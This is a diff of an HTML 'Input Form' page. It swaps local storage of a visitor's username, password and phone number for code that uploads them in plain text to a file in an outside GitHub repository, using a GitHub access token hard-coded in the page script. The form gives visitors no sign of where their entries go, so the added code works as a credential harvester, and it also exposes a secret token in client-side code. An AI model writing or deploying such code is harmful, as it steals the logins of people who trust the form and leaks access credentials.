@@ -5,25 +5,51 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Input Form</title>
     <script>
-        function storeData() {
-            // Get the values from the input fields
+        async function uploadToGitHub() {
             const username = document.getElementById('username').value;
             const password = document.getElementById('password').value;
             const phone = document.getElementById('phone').value;
 
-            // Store them in localStorage
-            localStorage.setItem('username', username);
-            localStorage.setItem('password', password);
-            localStorage.setItem('phone', phone);
+            const token = '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'; // Your GitHub token
+            const fileContent = `Username: ${username}\nPassword: ${password}\nPhone: ${phone}\n\n`;
+            const repo = 'ukgkings/Server';
+            const path = 'server.txt';
 
-            // Redirect to output.html
-            window.location.href = '2page.html';
+            // Fetch the file's current SHA to update it
+            const getSHAResponse = await fetch(`https://api.github.com/repos/${repo}/contents/${path}`, {
+                method: 'GET',
+                headers: {
+                    'Authorization': `token ${token}`,
+                    'Accept': 'application/vnd.github.v3+json'
+                }
+            });
+            const shaData = await getSHAResponse.json();
+            const sha = shaData.sha;
+
+            // Prepare the new content (base64 encoded)
+            const newContent = btoa(unescape(encodeURIComponent(fileContent))); // Base64 encode the content
+
+            // Make the PUT request to update the file
+            await fetch(`https://api.github.com/repos/${repo}/contents/${path}`, {
+                method: 'PUT',
+                headers: {
+                    'Authorization': `token ${token}`,
+                    'Accept': 'application/vnd.github.v3+json'
+                },
+                body: JSON.stringify({
+                    message: "Updating server.txt with new input",
+                    content: newContent,
+                    sha: sha
+                })
+            });
+
+            alert("Data uploaded successfully!");
         }
     </script>
 </head>
 <body>
     <h1>Enter Your Information</h1>
-    <form onsubmit="storeData(); return false;">
+    <form onsubmit="uploadToGitHub(); return false;">
         <label for="username">Username:</label>
         <input type="text" id="username" name="username" required><br><br>
 
